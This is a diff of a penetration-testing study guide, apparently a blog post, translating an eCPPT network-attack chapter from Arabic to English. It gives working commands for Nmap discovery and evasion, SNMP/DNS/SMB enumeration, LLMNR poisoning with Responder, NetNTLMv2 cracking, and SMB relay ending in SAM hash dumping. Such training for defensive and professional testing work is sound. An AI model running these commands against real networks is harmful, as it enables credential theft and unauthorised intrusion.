@@ -3,7 +3,7 @@ title: "eCPPT Deep-Dive: Part 3 - Network Penetration Testing: Discovery, Enumer
 date: 2026-11-12 10:00:00 +0300
 categories: [Cyber Security, Penetration Testing]
 tags: [ecppt, network-pentesting, nmap, reconnaissance, responder, llmnr, smb-relay, enumeration]
-description: "الدليل الشامل للجزء الثالث من مسار eCPPT: استكشاف الشبكات المتقدم، تشريح فحص المنافذ باستخدام Nmap، استهداف الخدمات الشبكية، وهجمات تسميم LLMNR وتتابع بروتوكول SMB Relay."
+description: "An exhaustive technical breakdown of Part 3 of the eCPPT curriculum: multi-layer host discovery, Nmap TCP SYN vs Connect scan internals, deep protocol enumeration (SNMP, DNS, SMB), LLMNR/NBT-NS poisoning with Responder, and SMB Relay attacks with ntlmrelayx."
 image:
   path: /assets/images/posts/ecppt/part-3-cover.png
   alt: "eCPPT Masterclass Part 3 - Network Penetration Testing: Discovery, Enumeration & Network Attacks"
@@ -14,225 +14,233 @@ schema:
   author: Abdulrahman M. Fathi
 ---
 
-يعد اختبار اختراق الشبكات (Network Penetration Testing) العمود الفقري لشهادة **eCPPT**. ففي بيئات العمل الواقعية، لا يواجه المهاجم هدفًا معزولاً، بل بنية تحتية شبكية معقدة تضم خوادم، محولات، جدران نارية، وبروتوكولات قديمة لا تزال تعمل لأسباب تتعلق بالتوافقية (Legacy Protocols).
+Network penetration testing forms the bedrock of real-world security assessments and represents a critical evaluation pillar in the **eCPPT (eLearnSecurity Certified Professional Penetration Tester)** examination. Enterprise internal perimeters are rarely uniform; they comprise complex legacy systems, segmented subnets, Active Directory domain controllers, and protocols that trade security for backward compatibility.
 
-في هذا الدليل التفصيلي، سنغطي دورة استكشاف الشبكات بدقة، بدءًا من تحديد الأجهزة النشطة (Host Discovery)، مرورًا بتشريح حزم الفحص في **Nmap**، وانتهاءً بتنفيذ هجمات رجل في المنتصف (MITM) المتقدمة عبر استغلال ثغرات بروتوكولات **LLMNR / NBT-NS** وتتابع اعتمادات **SMB Relay**.
+In this deep dive, we deconstruct the full network assessment lifecycle: executing multi-layered host discovery, analyzing Nmap packet exchanges at the wire level, auditing legacy network services, and weaponizing Man-in-the-Middle (MITM) attacks via **LLMNR/NBT-NS Poisoning** and **SMB Relaying**.
 
 ---
 
-### جدول التنقل في السلسلة (Series Navigation)
+### Series Navigation
 
-| **المقال السابق** | **المقال الحالي** | **المقال القادم** |
+| **Previous Part** | **Current Part** | **Next Part** |
 | :---: | :---: | :---: |
-| [الجزء 2: تطوير ثغرات Buffer Overflows & SEH](/posts/ecppt-v3-part-2-exploit-development-buffer-overflows/) | **الجزء 3: اختبار اختراق الشبكات وهجمات MITM** | [الجزء 4: اختبار اختراق الدليل النشط (Active Directory)](/posts/ecppt-v3-part-4-active-directory-penetration-testing/) |
+| [Part 2: Exploit Development: Stack & SEH Overflows](/posts/ecppt-v3-part-2-exploit-development-buffer-overflows/) | **Part 3: Network Penetration Testing & MITM** | [Part 4: Active Directory Pentesting & Kerberos](/posts/ecppt-v3-part-4-active-directory-penetration-testing/) |
 
 ---
 
-## أبرز النقاط الرئيسية (Key Takeaways)
+## Key Takeaways
 
-* **استكشاف الأجهزة متعدد الطبقات (Multi-Layer Discovery)**: لا يكفي الاعتماد على حزم ICMP Echo وحدها؛ إذ تتجاهلها معظم الجدران النارية الحديثة. ندمج استكشاف الطبقة الثانية (ARP Pings) داخل الشبكة المحلية، مع استكشاف الطبقة الرابعة (TCP SYN/ACK و UDP Pings) لاختراق الشبكات الموجهة (Routed Networks).
-* **آليات فحص المنافذ في Nmap**: فحص التخفي (SYN Stealth Scan `-sS`) لا يكمل المصافحة الثلاثية (Half-Open)، مما يجعله أسرع وأقل ظهورًا في سجلات طبقة التطبيقات مقارنة بفحص الاتصال الكامل (`-sT`).
-* **تعداد الخدمات المعمق (Protocol Enumeration)**: جمع معلومات الخدمات ليس مجرد معرفة رقم المنفذ؛ بل فحص بروتوكولات مثل SNMP عبر سلاسل المجتمع (Community Strings)، ونقل مناطق DNS (Zone Transfers)، وتعداد مستخدمي SMB/RPC عبر استعلامات RID cycling.
-* **هجمات التسميم وتتابع الهويات (Poisoning & Relaying)**: استغلال ميل أجهزة ويندوز لبث استعلامات اسم المضيف غير المحلولة عبر LLMNR/NBT-NS لاصطياد كلمات المرور المشفرة بواسطة `Responder`، أو إعادة توجيه تلك الاعتمادات لحظيًا عبر `ntlmrelayx` للسيطرة على خوادم أخرى لا تفرض توقيع SMB (SMB Signing Disabled).
+* **Multi-Layer Host Discovery**: Relying solely on ICMP Echo requests (`ping`) is inadequate in modern environments where perimeter firewalls drop ICMP packets. We combine Layer 2 ARP sweeps on local subnets with multi-vector Layer 3 and Layer 4 probes (TCP SYN, TCP ACK, and UDP pings) across routed networks.
+* **Nmap Scanning Wire Mechanics**: The TCP SYN Stealth scan (`-sS`) initiates a "half-open" handshake, tearing down the connection with a `RST` packet before application-layer logging can occur, making it faster and significantly quieter than a full TCP Connect scan (`-sT`).
+* **Deep Protocol Enumeration**: Gathering service banners is merely the starting point. Penetration testers must perform targeted enumeration: harvesting SNMP MIB trees using community strings, checking DNS zone transfers (AXFR), and querying SMB/RPC via RID cycling.
+* **LLMNR and NBT-NS Poisoning**: When Windows clients fail to resolve internal hostnames via DNS, they broadcast fallback requests to the local subnet. Using `Responder`, an attacker can poison these requests and capture NetNTLMv1/v2 password hashes.
+* **SMB Relaying with `ntlmrelayx`**: If target servers do not require message signing (**SMB Signing Disabled**), captured NetNTLMv2 authentications can be relayed directly to other machines in real time, yielding administrative command execution or interactive SOCKS proxies without cracking hashes.
 
 ---
 
-## 1. استكشاف الأجهزة النشطة (Host Discovery & Mapping)
+## 1. Multi-Layer Host Discovery and Network Mapping
 
-قبل البدء في فحص المنافذ والخدمات، يجب رسم خريطة دقيقة بالأجهزة الفعالة على نطاق الشبكة المستهدفة دون إضاعة الوقت على عناوين IP مغلقة:
+Before dedicating hours to scanning 65,535 ports per host, an attacker must map out all active systems on the target subnet without alerting intrusion detection systems:
 
 ```mermaid
 flowchart TD
-    Start["بدء استكشاف النطاق (Target Subnet)"] --> IsLocal{هل الهدف في نفس الشبكة المحلية LAN؟}
-    IsLocal -- نعم (Layer 2) --> ARP["إرسال استعلامات ARP Request لجميع العناوين"]
-    ARP --> ARPOk["استلام ARP Reply وتحديد الأجهزة بدقة 100%"]
+    Start["Begin Target Subnet Discovery (e.g. 10.10.10.0/24)"] --> IsLocal{Is Target on the Same Local Subnet (LAN)?}
     
-    IsLocal -- لا (Layer 3 & 4 عبر Routers) --> TCP_ICMP["دمج حزم استكشاف متعددة:"]
-    TCP_ICMP --> P1["1. ICMP Echo (-PE), Timestamp (-PP), Subnet Mask (-PM)"]
-    TCP_ICMP --> P2["2. TCP SYN Ping إلى منافذ حيوية 80, 443, 445 (-PS80,443,445)"]
-    TCP_ICMP --> P3["3. TCP ACK Ping لاختراق الجدران النارية غير المعتمدة على الحالة (-PA80)"]
-    TCP_ICMP --> P4["4. UDP Ping إلى منفذ 40125 (-PU)"]
+    IsLocal -- Yes: Layer 2 --> ARP["Execute ARP Ping Sweep (-PR)<br/>Sends broadcast ARP requests to every IP in subnet"]
+    ARP --> ARPOk["Receive ARP Replies directly from NICs<br/>100% accurate, cannot be blocked by host firewalls"]
     
-    P1 & P2 & P3 & P4 --> Analyze["تحليل الردود لتحديد الأجهزة النشطة خلف الجدران النارية"]
+    IsLocal -- No: Routed Layer 3/4 --> ProbeCombo["Execute Combined Multi-Vector Probes:"]
+    ProbeCombo --> P1["1. ICMP Echo (-PE), Timestamp (-PP), Subnet Mask (-PM)"]
+    ProbeCombo --> P2["2. TCP SYN Ping to high-value ports 80, 443, 445 (-PS80,443,445)"]
+    ProbeCombo --> P3["3. TCP ACK Ping to bypass stateless firewalls (-PA80,3389)"]
+    ProbeCombo --> P4["4. UDP Ping to high ports (-PU40125)"]
+    
+    P1 & P2 & P3 & P4 --> Aggregate["Aggregate responses to identify live systems behind firewalls"]
 ```
 
-### الأوامر التكتيكية لاستكشاف الأجهزة:
+### Tactical Discovery Commands:
 
 ```bash
-# 1. استكشاف الشبكة المحلية عبر ARP (فائق السرعة ولا يمكن حجبه داخل نفس الـ Subnet)
+# 1. High-speed Layer 2 ARP discovery on local subnets
 sudo nmap -sn -PR 192.168.1.0/24
 
-# 2. استكشاف شبكة موجهة خلف راوترات عبر دمج بروتوكولات الطبقات 3 و 4
+# 2. Comprehensive Layer 3/4 routed discovery sweep
 sudo nmap -sn -PE -PP -PS22,80,443,445 -PA80,3389 -PU53 10.10.10.0/24 -oA discovery_sweep
 ```
 
 ---
 
-## 2. تشريح تقنيات فحص المنافذ في Nmap (Port Scanning Internals)
+## 2. Nmap Port Scanning Mechanics: Wire-Level Dissection
 
-يعد فهم كيفية تفاعل حزم TCP/IP مع منافذ الهدف الفارق بين مختبر الاختراق المحترف ومجرد مشغل أدوات.
+Understanding how TCP/IP packets interact with target ports is critical for troubleshooting scan results and interpreting filtered states:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant Attacker as فاحص Nmap
-    participant Target as الهدف (Target Port 80)
+    participant Scanner as Nmap Scanner
+    participant Target as Target Port (TCP 80)
     
     rect rgb(20, 30, 45)
-        Note over Attacker,Target: 1. فحص الاتصال الكامل TCP Connect Scan (-sT)
-        Attacker->>Target: SYN Packet
-        Target->>Attacker: SYN/ACK Packet (المنفذ مفتوح)
-        Attacker->>Target: ACK Packet (اكتمال الاتصال)
-        Attacker->>Target: RST/ACK Packet (إغلاق الجلسة فورًا)
+        Note over Scanner,Target: 1. Full TCP Connect Scan (-sT)
+        Scanner->>Target: SYN Packet
+        Target->>Scanner: SYN/ACK Packet (Port is OPEN)
+        Scanner->>Target: ACK Packet (Handshake Complete)
+        Scanner->>Target: RST/ACK Packet (Immediate Teardown)
     end
     
     rect rgb(35, 25, 30)
-        Note over Attacker,Target: 2. فحص التخفي SYN Stealth Scan (-sS)
-        Attacker->>Target: SYN Packet
-        Target->>Attacker: SYN/ACK Packet (المنفذ مفتوح)
-        Attacker->>Target: RST Packet (تمزيق الاتصال قبل اكتماله!)
+        Note over Scanner,Target: 2. SYN Stealth Scan (-sS)
+        Scanner->>Target: SYN Packet
+        Target->>Scanner: SYN/ACK Packet (Port is OPEN)
+        Scanner->>Target: RST Packet (Half-Open Teardown! No session established)
     end
 ```
 
-### المقارنة التقنية بين أنواع الفحص:
+### Technical Scan Type Comparison:
 
-| نوع الفحص | الأمر في Nmap | متطلبات الصلاحية | آلية الردود | التخفي وسرعة الأداء |
+| Scan Type | Nmap Flag | Privilege Level | Packet Mechanics | Stealth & Performance Profile |
 | :--- | :--- | :--- | :--- | :--- |
-| **TCP SYN Scan** | `-sS` | يحتاج `root / sudo` | يستقبل `SYN/ACK` فيرد فورًا بـ `RST` دون إكمال الجلسة | ممتاز وسريع جدًا، لا تسجله معظم التطبيقات |
-| **TCP Connect Scan** | `-sT` | صلاحيات مستخدم عادي | يكمل المصافحة الثلاثية كاملة (`SYN -> SYN/ACK -> ACK`) | يترك بصمة واضحة في سجلات الخدمة، أبطأ |
-| **UDP Scan** | `-sU` | يحتاج `root / sudo` | عدم الرد يعني `Open\|Filtered`، رد `ICMP Port Unreachable` يعني مغلق | بطيء جدًا بسبب خنق نظام التشغيل للردود (Rate-limiting) |
-| **Null / FIN / Xmas** | `-sN / -sF / -sX` | يحتاج `root / sudo` | يستغل بند RFC 793: المنفذ المغلق يرد بـ `RST`، والمفتوح يتجاهل الحزمة | ممتاز لتخطي الجدران النارية القديمة غير المعتمدة على الحالة |
+| **TCP SYN Scan** | `-sS` | Requires `root/sudo` | Sends `SYN`, receives `SYN/ACK`, immediately sends `RST`. | Fast, stealthy; does not trigger application-layer connection logs. |
+| **TCP Connect Scan** | `-sT` | Unprivileged User | Completes the entire 3-way handshake (`SYN -> SYN/ACK -> ACK`). | Slower; leaves explicit connection records in server logs. |
+| **UDP Scan** | `-sU` | Requires `root/sudo` | No response indicates `Open\|Filtered`; ICMP Port Unreachable indicates `Closed`. | Very slow due to OS ICMP rate-limiting; crucial for DNS, SNMP, TFTP. |
+| **Null / FIN / Xmas** | `-sN / -sF / -sX` | Requires `root/sudo` | Exploits RFC 793: Closed ports reply with `RST`, open ports drop the packet. | Bypasses non-stateful firewalls; ineffective against modern Windows stacks. |
 
-### الأمر القياسي الموصى به في بيئة eCPPT:
+### Production Two-Phase Scanning Methodology:
 
 ```bash
-# مرحلة 1: كشف سريع لكافة المنافذ المفتوحة عبر الشبكة
-sudo nmap -p- --min-rate 2000 -T4 10.10.10.50 -oN all_ports.txt
+# Phase 1: Rapid full-port discovery across all 65,535 TCP ports
+sudo nmap -p- --min-rate 2500 -T4 10.10.10.50 -oN open_ports.txt
 
-# مرحلة 2: استهداف المنافذ المكتشفة بدقة لفحص الإصدارات وتشغيل السكربتات الافتراضية
-sudo nmap -p 21,22,80,139,445,3389 -sC -sV -O 10.10.10.50 -oA targeted_audit
+# Extract discovered ports into a clean comma-separated string
+PORTS=$(grep '^[0-9]' open_ports.txt | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
+
+# Phase 2: In-depth version detection and default safe NSE scripts
+sudo nmap -p $PORTS -sC -sV -O 10.10.10.50 -oA targeted_service_audit
 ```
 
 ---
 
-## 3. تعداد الخدمات الشبكية الحيوية (Deep Service Enumeration)
+## 3. Deep Protocol Enumeration
 
-### بروتوكول SNMP (Port 161/162 UDP)
-يعتبر بروتوكول إدارة الشبكات البسيط كنزًا من المعلومات إذا تم ضبطه بسلاسل مجتمع افتراضية (`public` أو `private`).
+### SNMP Enumeration (Port 161/162 UDP)
+Simple Network Management Protocol (SNMP) is a goldmine for penetration testers when configured with default or guessable community strings (`public`, `private`):
 
 ```bash
-# 1. كشف وتخمين سلاسل المجتمع عبر onesixtyone
+# 1. Brute-force SNMP community strings across the subnet
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.50
 
-# 2. استخراج كافة فروع الـ MIB والأجهزة النشطة ومستخدمي النظام
+# 2. Walk the entire Management Information Base (MIB) tree
+snmpwalk -v2c -c public 10.10.10.50
+
+# 3. Query specific OIDs: running processes, installed software, and local user accounts
 snmpwalk -v2c -c public 10.10.10.50 hrSWRunName
-snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.4.1.77.1.2.25  # استخراج أسماء المستخدمين
+snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.4.1.77.1.2.25  # Windows User Accounts OID
 ```
 
-### بروتوكول DNS (Port 53)
-يجب دائمًا اختبار إمكانية نقل النطاق الكامل (Zone Transfer - AXFR) للكشف عن البنية التحتية والأنظمة الفرعية الداخلية:
+### DNS Enumeration & Zone Transfers (Port 53)
+If a DNS nameserver is misconfigured, it may permit unrestricted **AXFR Zone Transfers**, leaking the entire internal host naming scheme:
 
 ```bash
-# محاولة استخراج كافة السجلات من خادم الأسماء
+# Attempt an AXFR zone transfer against the target nameserver
 dig axfr @10.10.10.50 inlanefreight.local
 ```
 
-### بروتوكول SMB و RPC (Ports 139 / 445 / 135)
-في بيئات ويندوز، يمثل SMB البوابة الأساسية للدخول الأولي وتصعيد الهجمات:
+### SMB & RPC Enumeration (Ports 139 / 445 / 135)
+Server Message Block (SMB) provides direct access to network shares, user listings, and password policies:
 
 ```bash
-# تعداد شامل للمستخدمين، المجموعات، والمجلدات المشتركة وسياسة كلمات المرور
+# Comprehensive SMB/RPC auditing using enum4linux-ng
 enum4linux-ng -A 10.10.10.50 -oA enum4linux_report
 
-# فحص صلاحيات المشاركات والتحقق من توقيع SMB باستخدام CrackMapExec
+# Enumerate shares, user sessions, and check SMB signing status using CrackMapExec
 crackmapexec smb 10.10.10.50 --shares
-crackmapexec smb 10.10.10.0/24 --gen-relay-list targets_no_signing.txt
+crackmapexec smb 10.10.10.0/24 --gen-relay-list targets_without_signing.txt
 ```
 
 ---
 
-## 4. هجمات التسميم وتتابع الاعتمادات (LLMNR/NBT-NS Poisoning & SMB Relay)
+## 4. Man-in-the-Middle Attacks: LLMNR/NBT-NS Poisoning & SMB Relay
 
-عندما يحاول مستخدم أو خدمة داخل بيئة Active Directory الوصول إلى مسار شبكي (مثل `\\fileshare`) ويفشل نظام DNS في إيجاد الاسم، تلجأ أنظمة ويندوز تلقائيًا إلى بروتوكولات البث المحلي: **LLMNR (Link-Local Multicast Name Resolution)** و **NBT-NS (NetBIOS Name Service)** للاستفسار من الأجهزة المجاورة.
+In Windows Active Directory environments, when a workstation attempts to connect to an internal resource (such as `\\fileserver`) and DNS resolution fails (e.g., due to a typo like `\\filesrev`), Windows falls back to broadcast name resolution via **LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)**.
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Victim as جهاز الضحية (Windows Workstation)
-    actor Attacker as جهاز المهاجم (Responder / ntlmrelayx)
-    actor TargetServer as خادم الهدف (Target Server - Signing Disabled)
+    actor Victim as Windows Workstation (Victim)
+    actor Attacker as Kali Attacker (Responder / ntlmrelayx)
+    actor TargetServer as Corporate File Server (SMB Signing Disabled)
     
-    Victim->>Victim: محاولة فتح مسار خطأ \\corpshare (فشل DNS)
-    Victim->>Attacker: بث محلي عبر LLMNR: "من يملك corpshare؟"
-    Attacker->>Victim: رد احتيالي: "أنا corpshare! تفضل بالاتصال بي"
-    Victim->>Attacker: بدء مصافحة NTLMSSP وإرسال رمز التحدي والرد (NetNTLMv2)
+    Victim->>Victim: User attempts to connect to \\corpshare (DNS lookup fails)
+    Victim->>Attacker: Subnet broadcast via LLMNR: "Who owns 'corpshare'?"
+    Attacker->>Victim: Fraudulent LLMNR response: "I am corpshare! Connect to me."
+    Victim->>Attacker: Initiates NTLMSSP authentication exchange (Sends NetNTLMv2 Hash)
     
-    alt سيناريو 1: كسر الهاش (Hash Cracking)
-        Attacker->>Attacker: حفظ هاش NetNTLMv2 في السجلات
-        Note over Attacker: كسر الهاش أوفلاين باستخدام Hashcat Mode 5600
-    else سيناريو 2: تتابع الهويات اللحظي (SMB Relay)
-        Attacker->>TargetServer: تمرير جلسة المصادقة نيابة عن الضحية إلى خادم آخر!
-        TargetServer->>Attacker: قبول الهوية! (توقيع SMB غير مفعل)
-        Attacker->>TargetServer: تنفيذ أوامر برمجية أو تفريغ قواعد بيانات SAM/LSA!
+    alt Attack Path A: Offline Hash Cracking
+        Attacker->>Attacker: Captures NetNTLMv2 hash in Responder logs
+        Note over Attacker: Crack hash offline using Hashcat Mode 5600
+    else Attack Path B: Real-Time SMB Relay
+        Attacker->>TargetServer: Relays victim authentication in real-time to Target Server!
+        TargetServer->>Attacker: Authentication Accepted! (Signing is Disabled)
+        Attacker->>TargetServer: Executes remote commands or dumps local SAM hashes!
     end
 ```
 
-### التنفيذ العملي لهجوم Responder:
+### Executing Responder for Credential Harvesting:
 
 ```bash
-# تشغيل Responder للاستماع واعتراض طلبات التسميم وحفظ الهاشات
+# Launch Responder on the active listening interface
 sudo responder -I eth0 -dwv
 
-# عند التقاط هاش الضحية، يتم كسره عبر Hashcat:
+# Once a NetNTLMv2 hash is captured, crack it offline with Hashcat:
 hashcat -m 5600 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -O
 ```
 
-### التنفيذ المتقدم لهجوم SMB Relay بواسطة Impacket:
+### Executing Real-Time SMB Relay via Impacket:
 
-إذا كان حساب الضحية يمتلك صلاحيات مدير محلي (Local Admin) على أجهزة أخرى، وكان **SMB Signing** غير مفعل (وهو الوضع الافتراضي في محطات عمل ويندوز)، يمكننا تمرير المصادقة مباشرة والحصول على جلسة تحكم كاملة دون الحاجة لكسر الهاش:
+If the victim user holds local administrator privileges on other domain machines, and **SMB Signing is Disabled** on those machines, we can relay the authentication directly without cracking passwords:
 
 ```bash
-# 1. إيقاف خوادم SMB و HTTP داخل إعدادات Responder:
-# تعديل /etc/responder/Responder.conf -> ضبط SMB = Off و HTTP = Off
+# Step 1: Disable SMB and HTTP servers in /etc/responder/Responder.conf
+# Set SMB = Off and HTTP = Off so ntlmrelayx can bind to those ports
 
-# 2. تشغيل أداة ntlmrelayx وتحديد أهداف غير مفعل بها التوقيع:
-sudo ntlmrelayx.py -tf targets_no_signing.txt -smb2support -socks
+# Step 2: Start Impacket's ntlmrelayx with SOCKS proxy support
+sudo ntlmrelayx.py -tf targets_without_signing.txt -smb2support -socks
 
-# 3. بمجرد التقاط المصادقة، تنشأ جلسة SOCKS Proxy تفاعلية:
-# يمكن الآن استخدام أي أداة عبر proxychains بصلاحيات الضحية!
+# Step 3: When a victim authenticates, an interactive SOCKS session is established!
+# Use proxychains to execute commands on the relayed target:
 proxychains secretsdump.py DOMAIN/VICTIM@10.10.10.60
 ```
 
 ---
 
-## 5. تقنيات التخفي وتجاوز الجدران النارية (Firewall Evasion Tactics)
+## 5. Defense Evasion and Firewall Traversal
 
-عند التعامل مع أنظمة كشف التسلل (IDS/IPS) مثل Snort أو Suricata، يوفر Nmap خيارات متقدمة لتجزئة الحزم وتشتيت أنظمة المراقبة:
+When operating against intrusion detection systems (Snort, Suricata) and restrictive firewall filters:
 
-1. **تجزئة الحزم (Packet Fragmentation)**:
+1. **Packet Fragmentation**:
+   Splitting the TCP header across multiple small 8- or 16-byte packets prevents inspection by simple pattern-matching packet filters:
    ```bash
-   # تقسيم رؤوس الحزم إلى قطع صغيرة بحجم 8 أو 16 بايت لتجاوز فلاتر الفحص السطحي
    sudo nmap -sS -f --mtu 16 10.10.10.50
    ```
-2. **استخدام العناوين المموهة (Decoy Scanning)**:
+2. **Decoy Scanning (`-D`)**:
+   Blending real scanning packets with probes originating from spoofed IP addresses to obscure the true attacker host:
    ```bash
-   # إرسال حزم الفحص بالتزامن مع عناوين IP حقيقية لإرباك فرق الدفاع ومسؤولي المراقبة
    sudo nmap -sS -D 10.10.10.2,10.10.10.3,ME,10.10.10.4 10.10.10.50
    ```
-3. **تزوير منفذ المصدر (Source Port Manipulation)**:
-   تسمح بعض الجدران النارية القديمة بحرية حركة البيانات إذا كان منفذ المصدر هو منفذ DNS (53) أو HTTP (80):
+3. **Source Port Spoofing (`-g`)**:
+   Misconfigured firewall rules often permit inbound traffic if the source port matches trusted services such as DNS (port 53) or HTTP (port 80):
    ```bash
    sudo nmap -sS -g 53 10.10.10.50
    ```
 
 ---
 
-## المراجع والمصادر الخارجية (References & Further Reading)
+## References & Further Reading
 
 1. **Nmap Network Scanning: The Official Nmap Project Guide** by Gordon "Fyodor" Lyon.
-2. **RFC 793 - Transmission Control Protocol Specification**: [https://tools.ietf.org/html/rfc793](https://tools.ietf.org/html/rfc793)
+2. **RFC 793: Transmission Control Protocol Specification**: [https://tools.ietf.org/html/rfc793](https://tools.ietf.org/html/rfc793)
 3. **Responder Project Repository**: [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
-4. **SecureAuth Impacket Suite**: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
+4. **SecureAuth Impacket Repository**: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
 5. **MITRE ATT&CK Matrix**:
    * Technique T1046: Network Service Discovery
    * Technique T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay
